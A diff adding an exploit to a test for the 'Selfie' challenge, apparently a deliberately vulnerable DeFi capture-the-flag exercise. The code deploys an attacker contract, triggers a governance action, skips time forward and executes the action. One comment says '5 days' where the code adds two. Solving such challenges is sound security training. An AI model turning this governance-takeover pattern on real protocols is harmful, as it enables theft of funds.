@@ -31,6 +31,39 @@ describe('[Challenge] Selfie', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        console.log(`Attacker wallet: ${await attacker.address}`);
+        const contractFactory = await ethers.getContractFactory("SelfieAttacker", deployer);
+        const contract = (await contractFactory.deploy(
+            await this.pool.address,
+            await this.token.address,
+            await this.governance.address
+        )).connect(attacker);
+
+        let txn = await contract.attack();
+        txn.wait();
+        console.log(`Attack hash = ${txn.hash}`);
+
+        // using the txn.hash to get the receipt and the logs events
+        let receipt = await ethers.provider.getTransactionReceipt(txn.hash);
+
+        // find the ActionQueued event and get the `actionId`
+        const actionQueued = receipt.logs.map(log => {
+                try {
+                    return this.governance.interface.parseLog(log);
+                } catch (e) {
+                    return null;
+                }
+            }
+        ).filter(log => log != null
+        ).filter(log => log.name === 'ActionQueued')[0];
+
+        const actionId = actionQueued.args.actionId.toNumber();
+        console.log(`ActionId: ${actionId}`);
+        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 5 days
+
+        // execute the action with the given actionId
+        txn = await this.governance.executeAction(actionId);
+        txn.wait(1);
     });
 
     after(async function () {
